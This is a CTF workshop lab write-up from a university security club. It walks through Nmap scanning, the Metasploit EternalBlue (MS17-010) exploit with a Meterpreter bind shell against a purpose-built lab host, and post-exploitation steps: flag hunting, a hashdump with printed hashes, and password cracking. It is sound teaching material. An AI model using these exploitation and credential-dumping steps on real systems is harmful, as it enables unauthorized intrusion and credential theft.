# EternalBlue | Lab | UtahSec 2026-02-04

Author: Carson He (zakstamaj)

CTF technical skills workshop on performing target reconnaissance with Nmap and exploitation with Metasploit using the infamous EternalBlue exploit.

Target: `eternalblue-lab.carsonhe.dev`

## Setup

You will need the following tools installed:
* Nmap
* Metasploit

### Windows users

For Windows users, I recommend installing the tools in a WSL environment. This has the advantage of not cluttering your main environment and not needing to potentially modify your PATH environment variable.

To check whether WSL is installed, open a terminal and run:

```
wsl --status
```

If your machine doesn't already have WSL, run:

```
wsl --install
```

After installing WSL, install the Kali Linux distro:

```
wsl --install kali-linux
```

After installing Kali Linux, run the distro:

```
wsl -d kali-linux
```

If needed, follow the prompts to set up an account in the distro.

Once you are logged into Kali Linux, install Nmap and Metasploit:

```
sudo apt update
sudo apt install nmap metasploit-framework
```

## Reconnaissance with Nmap

To start our reconnaissance, run Nmap in aggressive mode against the target to see what ports are open:

```
nmap -A eternalblue-lab.carsonhe.dev
```

You may see this message:

```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

If so, add the option:

```
nmap -A eternalblue-lab.carsonhe.dev -Pn
```

> [!IMPORTANT]
> What ports are open on the target? What OS is it running?

<details>
<summary>Answer (click to reveal)</summary>

Ports 135, 139, and 445 are open. The target is running Windows 7.
</details>

Now, let's try using the NSE (Nmap Scripting Engine) to scan for potential vulnerabilities on the target. The `--script vuln` flag tells Nmap to run scripts in the "vulnerabilities" category in an attempt to identify vulnerabilities.

```
nmap eternalblue-lab.carsonhe.dev -Pn --script vuln
```

> [!IMPORTANT]
> What vulnerability is open on the target?

<details>
<summary>Answer (click to reveal)</summary>

You should see output like this:

```
Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
```

The target has the MS17-010 or CVE-2017-0143 vulnerability, which allows arbitrary code execution through Microsoft's implementation of the SMBv1 protocol.
</details>

## Vulnerability scan in Metasploit

Launch the Metasploit console:

```
msfconsole
```

Metasploit works with *modules*, which are components that perform some task against a target.

To practice using Metasploit, we can also test whether the target has the MS17-010 vulnerability in Metasploit instead of Nmap.

Let's search for a module that can scan for the MS17-010 vulnerability:

```
search ms17-010
```

You should see `auxiliary/scanner/smb/smb_ms17_010` in the listing. Load the scanner module:

```
use auxiliary/scanner/smb/smb_ms17_010
```

You can view more information for the current module:

```
info
```

Each module has a set of configurable options, such as `RHOSTS` to specify target addresses and `RPORT` to specify the target port. Look at the list of options:

```
options
```

We only need to set one option, the target address:

```
set RHOSTS eternalblue-lab.carsonhe.dev
```

You can use `get RHOSTS` or `options` again to check that `RHOSTS` has been correctly set.

Now, run the module:

```
run
```

You should see output like this:

```
[+] <IP address>:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] eternalblue-lab.carsonhe.dev:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We have now verified that the target is vulnerable to MS17-010 in Metasploit.

## Exploitation with Metasploit

When searching for MS17-010 modules, you might have also seen the `exploit/windows/smb/ms17_010_eternalblue` module. This module performs the actual EternalBlue exploit against the MS17-010 vulnerability.

Load the exploit module:

```
use exploit/windows/smb/ms17_010_eternalblue
```

By default, Metasploit will also load the `windows/x64/meterpreter/reverse_tcp` payload. Usually, a reverse shell is ideal, but because configuring port forwarding on the university network is hard, let's use a bind shell instead:

```
set payload windows/x64/meterpreter/bind_tcp
```

> [!NOTE]
> What is a reverse shell and a bind shell?
>
> When an exploit is able to achieve remote code execution, attackers usually want to gain remote shell access over the Internet to run any commands that they want on the target. A bind shell payload starts a shell on the target machine with a listener socket on the target, waiting for the attacker to initiate a network connection to the target. A reverse shell payload starts a shell and initiates a network connection to the attacker's machine. Since firewalls tend to have strict rules with inbound connections compared to outbound connections, reverse shells can bypass firewalls much easier than bind shells.
>
> However, a reverse shell requires the attacker to set up the listener socket, which usually requires port forwarding because of NAT in IPv4 networks. We do not have access to configure port forwarding on the university network, so we use a bind shell instead in this lab. I have configured the target VM to accept inbound connections to port 4444, which is the default listening port for the bind shell payload.

> [!NOTE]
> What is Meterpreter?
>
> Meterpreter is a payload provided by Metasploit that creates a powerful interactive remote shell for the attacker to run commands on the target system.

Set the target address:

```
set RHOSTS eternalblue-lab.carsonhe.dev
```

Run the exploit:

```
run
```

The exploit can take a few minutes, and each exploitation attempt has a chance of failing. Once the exploit succeeds however, you should see a Meterpreter shell:

```
meterpreter >
```

You can check if the shell is live by running a command:

```
getuid
```

This should return the current user that the shell is running under. You should see:

```
Server username: NT AUTHORITY\SYSTEM
```

Congratulations! You now have a remote shell logged in as the superuser and have pwned the target system!

## Post-exploitation and data exfiltration

Now that we have a remote shell into the target system, we can do a lot of things to it. For this lab however, we will capture a flag and crack a user's password.

Look around the files of the system with the `ls` and `cd` commands. You can print the contents of a file with the `cat` command.

> [!IMPORTANT]
> Can you find the flag.txt file?

<details>
<summary>Answer (click to reveal)</summary>

The `flag.txt` file is at `C:\Users\user\Documents\flag.txt`.
</details>

We can also dump the password hashes of user accounts on the system:

```
hashdump
```

> [!IMPORTANT]
> Can you recover the password of `user`? <https://crackstation.net/> is a good resource for looking up unsalted hashes.

<details>
<summary>Answer (click to reveal)</summary>

The output of `hashdump` should be:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1000:aad3b435b51404eeaad3b435b51404ee:a0ff17db5d0f72b434b44dfd6b6cb044:::
```

Putting the hash `a0ff17db5d0f72b434b44dfd6b6cb044` in CrackStation yields the password of `hamburger`.
</details>

## Conclusion

I hope you enjoyed this lab and learned something new! Nmap and Metasploit are fundamental tools in penetration testing. I also hope that this lab has demonstrated the importance of keeping software up-to-date with security patches.
